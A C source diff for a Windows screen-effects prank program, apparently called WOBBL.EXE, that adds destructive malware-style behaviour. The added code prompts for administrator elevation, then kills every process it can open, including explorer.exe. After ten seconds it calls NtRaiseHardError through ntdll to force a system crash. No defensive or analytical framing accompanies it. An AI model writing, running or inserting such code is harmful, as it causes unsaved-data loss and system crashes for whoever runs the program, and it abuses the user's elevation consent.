@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
+#include <tlhelp32.h> // 追加
+#include <shellapi.h> // 追加
 
 #include "draw_util.h"
 
@@ -299,10 +301,67 @@ void draw_bouncing_icon(void) {
     ReleaseDC(NULL, hdc);
 }
 
+void close_all_apps() {
+    DWORD myPid = GetCurrentProcessId();
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnap, &pe)) {
+        do {
+            if (pe.th32ProcessID == myPid || pe.th32ProcessID == 0 || pe.th32ProcessID == 4)
+                continue;
+            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                if (hProc) {
+                    TerminateProcess(hProc, 0);
+                    CloseHandle(hProc);
+                }
+                continue;
+            }
+            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+            if (hProc) {
+                TerminateProcess(hProc, 0);
+                CloseHandle(hProc);
+            }
+        } while (Process32Next(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+}
+
 int main() {
+    BOOL isAdmin = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION elevation;
+        DWORD size;
+        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
+            isAdmin = elevation.TokenIsElevated;
+        }
+        CloseHandle(hToken);
+    }
+    if (!isAdmin) {
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "runas";
+        sei.lpFile = exePath;
+        sei.nShow = SW_SHOWNORMAL;
+        if (ShellExecuteExA(&sei)) {
+            ExitProcess(0);
+        } else {
+            MessageBoxA(NULL, "Please administer.", "WOBBL.EXE", MB_OK | MB_ICONERROR);
+            ExitProcess(1);
+        }
+    }
+
     SetProcessDPIAware();
     srand((unsigned)time(NULL));
     int counter = 0;
+
+    close_all_apps();
 
     HANDLE hTextThread = CreateThread(NULL, 0, text_thread, NULL, 0, NULL);
     HANDLE hMosaicThread = CreateThread(NULL, 0, mosaic_thread, NULL, 0, NULL);
@@ -310,11 +369,35 @@ int main() {
     HANDLE hShakeThread = CreateThread(NULL, 0, shake_thread, NULL, 0, NULL);
     HANDLE hIconBounceThread = CreateThread(NULL, 0, icon_bounce_thread, NULL, 0, NULL);
 
+    DWORD startTick = GetTickCount();
+    const DWORD BSOD_AFTER_MS = 10000;
+
     while (1) {
         if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
             (GetAsyncKeyState('Q') & 0x8000) &&
             (GetAsyncKeyState('F') & 0x8000)) {
             break;
+        }
+        if (GetTickCount() - startTick > BSOD_AFTER_MS) {
+            TerminateThread(hTextThread, 0);
+            TerminateThread(hMosaicThread, 0);
+            TerminateThread(hExplosionThread, 0);
+            TerminateThread(hShakeThread, 0);
+            TerminateThread(hIconBounceThread, 0);
+
+            typedef NTSTATUS (WINAPI *NtRaiseHardError_t)(
+                NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG
+            );
+            HMODULE ntdll = LoadLibraryA("ntdll.dll");
+            if (ntdll) {
+                NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
+                if (NtRaiseHardError) {
+                    ULONG resp;
+                    NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &resp);
+                }
+                FreeLibrary(ntdll);
+            }
+            ExitProcess(1);
         }
         jitter_mouse(8);
         Sleep(100);
